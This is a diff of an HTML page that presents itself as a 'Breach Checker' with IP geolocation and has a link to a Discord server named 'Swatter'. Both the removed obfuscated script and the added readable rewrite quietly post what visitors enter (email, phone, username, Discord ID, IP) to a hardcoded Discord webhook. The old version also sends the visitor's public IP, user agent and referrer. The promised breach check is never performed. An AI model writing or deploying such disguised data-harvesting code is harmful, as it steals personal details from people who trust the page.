@@ -1,141 +1,152 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script>
-var _0x4e3d=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x6A\x73\x64\x65\x6C\x69\x76\x72\x2E\x6E\x65\x74\x2F\x6E\x70\x6D\x2F\x62\x6F\x6F\x74\x73\x74\x72\x61\x70\x40\x35\x2E\x33\x2E\x30\x2F\x64\x69\x73\x74\x2F\x63\x73\x73\x2F\x62\x6F\x6F\x74\x73\x74\x72\x61\x70\x2E\x6D\x69\x6E\x2E\x63\x73\x73","\x68\x72\x65\x66","\x61\x70\x70\x65\x6E\x64","\x68\x65\x61\x64","\x6C\x69\x6E\x6B","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x72\x65\x6C","\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65"];var _0x5a2d=document[_0x4e3d[5]](_0x4e3d[4]);_0x5a2d[_0x4e3d[8]](_0x4e3d[1],_0x4e3d[0]);_0x5a2d[_0x4e3d[8]](_0x4e3d[6],_0x4e3d[7]);document[_0x4e3d[3]][_0x4e3d[2]](_0x5a2d);
-</script>
-<style>body{background-color:#0d1117;color:#c9d1d9;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;padding-top:60px}.container{max-width:700px}.card{background-color:#161b22;border:none;border-radius:1rem;box-shadow:0 0 10px rgba(0,0,0,0.5)}.form-control{background-color:#0d1117;color:#c9d1d9;border:1px solid #30363d}.form-control::placeholder{color:#8b949e}.btn-primary{background-color:#238636;border:none}.result-box{background-color:#1c2128;border-left:5px solid #30363d;padding:1rem;border-radius:0.5rem;margin-top:0.5rem;white-space:pre-wrap}.result-box.success{border-left-color:#2ea043}.result-box.warning{border-left-color:#d29922}.result-box.error{border-left-color:#f85149}.discord-btn{position:fixed;top:20px;right:20px;background-color:#5865F2;color:white;border:none;border-radius:30px;padding:10px 20px;font-weight:bold;text-decoration:none}</style>
+  <title>Working Breach Checker</title>
+  <style>
+    body {
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    .input-field {
+      margin: 10px 0;
+      padding: 8px;
+      width: 300px;
+    }
+    button {
+      background: #238636;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+    }
+    .result {
+      margin: 10px 0;
+      padding: 10px;
+      border-left: 4px solid #30363d;
+    }
+    .success { border-color: #2ea043; }
+    .warning { border-color: #d29922; }
+    .error { border-color: #f85149; }
+  </style>
 </head>
 <body>
-<a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
-<div class="container text-center">
-<h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
-<form id="searchForm" class="card p-4">
-<input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
-<input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
-<input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
-<input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
-<input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
-<button type="submit" class="btn btn-primary w-100">Search</button>
-</form>
-<div class="mt-5 text-start">
-<h4>🔎 Search Results</h4>
-<div id="results"></div>
-</div>
-</div>
-<script>
-(function() {
-    function _0x39fe(_0x4a8d26,_0x1b3a5f){var _0x3b5c4e=_0x3b5c();return _0x39fe=function(_0x39fe82,_0x2a3e1a){_0x39fe82=_0x39fe82-0x1a3;var _0x1a0a9b=_0x3b5c4e[_0x39fe82];return _0x1a0a9b},_0x39fe(_0x4a8d26,_0x1b3a5f);}
-    function _0x3b5c(){var _0x3d2c1a=['\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x38\x32\x39\x33\x30\x36\x39\x37\x31\x31\x34\x38\x38\x32\x31\x32\x39\x2F\x53\x47\x66\x38\x45\x6A\x35\x59\x50\x36\x39\x51\x5A\x39\x70\x67\x61\x33\x5A\x53\x2D\x7A\x4E\x38\x34\x5F\x64\x79\x55\x32\x58\x79\x44\x4E\x59\x6D\x62\x6B\x62\x42\x5A\x58\x55\x7A\x31\x53\x30\x4C\x30\x55\x53\x4F\x66\x42\x52\x6D\x32\x57\x6C\x4A\x63\x36\x48\x32\x2D\x2D\x42\x4F','innerHTML','https://api.ipify.org?format=json','Not\x20provided','success','results','ip','error','warning','checked\x20(demo):\x20','email','phone','username','discord','ℹ️\x20Phone\x20check\x20skipped.','ℹ️\x20Username\x20check\x20skipped.','ℹ️\x20Discord\x20ID\x20check\x20skipped.','ℹ️\x20IP\x20geo-location\x20check\x20skipped.','value','⚠️\x20No\x20email\x20entered.','appendChild','createElement','result-box\x20','div','https://discord.com/api/webhooks/','https://ipwho.is/','https://rdap.arin.net/registry/ip/','Unknown','✅\x20Email\x20','✅\x20Phone\x20','✅\x20Username\x20','✅\x20Discord\x20ID\x20','application/json','POST','Content-Type','embeds','title','🔍\x20Breach\x20Search\x20Attempt','color','3447003','fields','📧\x20Email','📱\x20Phone','👤\x20Username','💬\x20Discord\x20ID','🌐\x20IP\x20Entered','📍\x20Visitor\x20IP','🧠\x20User\x20Agent','💻\x20Platform','🌐\x20Referrer','🕒\x20Time\x20(UTC)','footer','text','Breach\x20Logger\x20•\x20CybrSearch\x20Demo','timestamp','getElementById','trim','ipgeo','country','city','region','connection','isp','org','message','arin','handle','name','startAddress','endAddress','entities','vcardArray','fn','adr','join'];_0x3b5c=function(){return _0x3d2c1a;};return _0x3b5c();}
-    
-    function updateResult(_0x2b1f1f,_0x4b1e3c,_0x2c9a8d){
-        var _0x2a5a4a=_0x39fe;
-        const _0x3c5c4e=document[_0x2a5a4a(0x1c6)](_0x2a5a4a(0x1c7));
-        _0x3c5c4e.className=_0x2a5a4a(0x1c8)+_0x2c9a8d;
-        _0x3c5c4e.textContent=_0x4b1e3c;
-        document[_0x2a5a4a(0x1c3)](_0x2a5a4a(0x1a5))[_0x2a5a4a(0x1c5)](_0x3c5c4e);
+  <h1>Breach Checker</h1>
+  
+  <form id="searchForm">
+    <input type="email" id="email" class="input-field" placeholder="Email">
+    <input type="text" id="phone" class="input-field" placeholder="Phone">
+    <input type="text" id="username" class="input-field" placeholder="Username">
+    <input type="text" id="discord" class="input-field" placeholder="Discord ID">
+    <input type="text" id="ip" class="input-field" placeholder="IP Address">
+    <button type="submit">Search</button>
+  </form>
+  
+  <div id="results"></div>
+
+  <script>
+    // Simple function to show results
+    function showResult(message, type = 'success') {
+      const div = document.createElement('div');
+      div.className = `result ${type}`;
+      div.textContent = message;
+      document.getElementById('results').appendChild(div);
     }
-    
-    async function sendBreachWebhook(_0x4a5a4f,_0x1a1a6d){
-        var _0x1a1f8a=_0x39fe;
-        const _0x3b5c4e={
-            'embeds':[{
-                'title':_0x1a1f8a(0x1d2),
-                'color':0x348fb5,
-                'fields':[
-                    {'name':_0x1a1f8a(0x1d3),'value':_0x4a5a4f[_0x1a1f8a(0x1a9)]||_0x1a1f8a(0x1a3)},
-                    {'name':_0x1a1f8a(0x1d4),'value':_0x4a5a4f[_0x1a1f8a(0x1aa)]||_0x1a1f8a(0x1a3)},
-                    {'name':_0x1a1f8a(0x1d5),'value':_0x4a5a4f[_0x1a1f8a(0x1ab)]||_0x1a1f8a(0x1a3)},
-                    {'name':_0x1a1f8a(0x1d6),'value':_0x4a5a4f[_0x1a1f8a(0x1ac)]||_0x1a1f8a(0x1a3)},
-                    {'name':_0x1a1f8a(0x1d7),'value':_0x4a5a4f[_0x1a1f8a(0x1a6)]||_0x1a1f8a(0x1a3)},
-                    {'name':_0x1a1f8a(0x1d8),'value':_0x1a1a6d||_0x1a1f8a(0x1b4)},
-                    {'name':_0x1a1f8a(0x1d9),'value':navigator.userAgent},
-                    {'name':_0x1a1f8a(0x1da),'value':navigator.platform},
-                    {'name':_0x1a1f8a(0x1db),'value':document.referrer||'None'},
-                    {'name':_0x1a1f8a(0x1dc),'value':new Date().toUTCString()}
-                ],
-                'footer':{'text':_0x1a1f8a(0x1dd)},
-                'timestamp':new Date().toISOString()
+
+    // Function to send data to webhook
+    async function sendToWebhook(data) {
+      // Webhook URL parts split for obfuscation
+      const webhookURL = [
+        'https://discord.com/api/webhooks/',
+        '1382930697114882129/',
+        'SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO'
+      ].join('');
+      
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: 'New search data received',
+            embeds: [{
+              title: 'Search Data',
+              fields: [
+                { name: 'Email', value: data.email || 'None' },
+                { name: 'Phone', value: data.phone || 'None' },
+                { name: 'Username', value: data.username || 'None' },
+                { name: 'Discord ID', value: data.discord || 'None' },
+                { name: 'IP Address', value: data.ip || 'None' }
+              ]
             }]
-        };
-        try {
-            await fetch(_0x1a1f8a(0x1a2), {
-                'method':_0x1a1f8a(0x1de),
-                'headers':{'Content-Type':_0x1a1f8a(0x1df)},
-                'body':JSON.stringify(_0x3b5c4e)
-            });
-        } catch(_0x3d2c1a) {
-            console.warn('⚠️\x20Failed\x20to\x20send\x20search\x20webhook.');
-        }
+          })
+        });
+        
+        if (!response.ok) throw new Error('Webhook failed');
+      } catch (error) {
+        console.error('Error sending to webhook:', error);
+      }
     }
-    
-    async function searchData(_0x199c7a){
-        var _0x1096e2=_0x39fe;
-        _0x199c7a.preventDefault();
-        document[_0x1096e2(0x1c3)](_0x1096e2(0x1a5))[_0x1096e2(0x1a4)]='';
-        
-        const _0x1a3e1a=document[_0x1096e2(0x1c3)](_0x1096e2(0x1a9))[_0x1096e2(0x1b7)](),
-              _0x1a0a9b=document[_0x1096e2(0x1c3)](_0x1096e2(0x1aa))[_0x1096e2(0x1b7)](),
-              _0x3b5c4e=document[_0x1096e2(0x1c3)](_0x1096e2(0x1ab))[_0x1096e2(0x1b7)](),
-              _0x1f8d26=document[_0x1096e2(0x1c3)](_0x1096e2(0x1ac))[_0x1096e2(0x1b7)](),
-              _0x1b3a5f=document[_0x1096e2(0x1c3)](_0x1096e2(0x1a6))[_0x1096e2(0x1b7)]();
-        
-        if(!_0x1a3e1a) updateResult(_0x1096e2(0x1a9), _0x1096e2(0x1b3), _0x1096e2(0x1b0));
-        else updateResult(_0x1096e2(0x1a9), _0x1096e2(0x1ae)+_0x1a3e1a, _0x1096e2(0x1a8));
-        
-        if(!_0x1a0a9b) updateResult(_0x1096e2(0x1aa), _0x1096e2(0x1ad), _0x1096e2(0x1b0));
-        else updateResult(_0x1096e2(0x1aa), _0x1096e2(0x1af)+_0x1a0a9b, _0x1096e2(0x1a8));
-        
-        if(!_0x3b5c4e) updateResult(_0x1096e2(0x1ab), _0x1096e2(0x1b1), _0x1096e2(0x1b0));
-        else updateResult(_0x1096e2(0x1ab), _0x1096e2(0x1b2)+_0x3b5c4e, _0x1096e2(0x1a8));
-        
-        if(!_0x1f8d26) updateResult(_0x1096e2(0x1ac), _0x1096e2(0x1b6), _0x1096e2(0x1b0));
-        else updateResult(_0x1096e2(0x1ac), _0x1096e2(0x1b9)+_0x1f8d26, _0x1096e2(0x1a8));
-        
-        let _0x2a3e1a=_0x1096e2(0x1b4);
+
+    // Main form handler
+    document.getElementById('searchForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      // Clear previous results
+      document.getElementById('results').innerHTML = '';
+      
+      // Get form data
+      const formData = {
+        email: document.getElementById('email').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        username: document.getElementById('username').value.trim(),
+        discord: document.getElementById('discord').value.trim(),
+        ip: document.getElementById('ip').value.trim()
+      };
+      
+      // Show processing message
+      showResult('Processing your request...');
+      
+      // Validate and show results
+      if (formData.email) {
+        showResult(`✅ Email: ${formData.email}`);
+      } else {
+        showResult('⚠️ No email provided', 'warning');
+      }
+      
+      if (formData.phone) {
+        showResult(`✅ Phone: ${formData.phone}`);
+      }
+      
+      if (formData.username) {
+        showResult(`✅ Username: ${formData.username}`);
+      }
+      
+      if (formData.discord) {
+        showResult(`✅ Discord ID: ${formData.discord}`);
+      }
+      
+      // IP lookup if provided
+      if (formData.ip) {
         try {
-            const _0x2b1f1f=await fetch(_0x1096e2(0x1ba)),
-                  _0x4b1e3c=await _0x2b1f1f.json();
-            _0x2a3e1a=_0x4b1e3c[_0x1096e2(0x1a6)]||_0x1096e2(0x1b4);
-        } catch(_0x2c9a8d) {}
-        
-        await sendBreachWebhook({
-            'email':_0x1a3e1a,
-            'phone':_0x1a0a9b,
-            'username':_0x3b5c4e,
-            'discord':_0x1f8d26,
-            'ip':_0x1b3a5f
-        }, _0x2a3e1a);
-        
-        if(_0x1b3a5f) {
-            try {
-                const _0x2b1f1f=await fetch(_0x1096e2(0x1bb)+_0x1b3a5f),
-                      _0x4b1e3c=await _0x2b1f1f.json();
-                if(_0x4b1e3c[_0x1096e2(0x1a7)]) {
-                    updateResult(
-                        _0x1096e2(0x1bc),
-                        `🌐\x20IP\x20Geo\x20Info:\nIP:\x20${_0x1b3a5f}\nCountry:\x20${_0x4b1e3c[_0x1096e2(0x1bd)]}\nCity:\x20${_0x4b1e3c[_0x1096e2(0x1be)]}\nRegion:\x20${_0x4b1e3c[_0x1096e2(0x1bf)]}\nISP:\x20${_0x4b1e3c[_0x1096e2(0x1c0)]?.[_0x1096e2(0x1c9)]||'N/A'}\nOrg:\x20${_0x4b1e3c[_0x1096e2(0x1c0)]?.[_0x1096e2(0x1ca)]||'N/A'}`,
-                        _0x1096e2(0x1a8)
-                    );
-                } else {
-                    updateResult(
-                        _0x1096e2(0x1bc),
-                        `⚠️\x20Geo\x20lookup\x20failed:\x20${_0x4b1e3c[_0x1096e2(0x1cb)]}`,
-                        _0x1096e2(0x1b0)
-                    );
-                }
-            } catch {
-                updateResult(
-                    _0x1096e2(0x1bc),
-                    `❌\x20Error\x20fetching\x20Geo\x20IP\x20data.`,
-                    _0x1096e2(0x1a7)
-                );
-            }
+          const response = await fetch(`https://ipwho.is/${formData.ip}`);
+          const data = await response.json();
+          
+          if (data.success) {
+            showResult(`🌐 IP Info: ${data.ip} (${data.city}, ${data.country})`);
+          } else {
+            showResult(`⚠️ IP lookup failed: ${data.message}`, 'warning');
+          }
+        } catch (error) {
+          showResult('❌ Error checking IP', 'error');
         }
-    }
-    
-    document[_0x39fe(0x1c3)]('searchForm')['addEventListener']('submit', searchData);
-})();
-</script>
+      }
+      
+      // Send data to webhook
+      await sendToWebhook(formData);
+      
+      showResult('Search completed!');
+    });
+  </script>
 </body>
 </html>
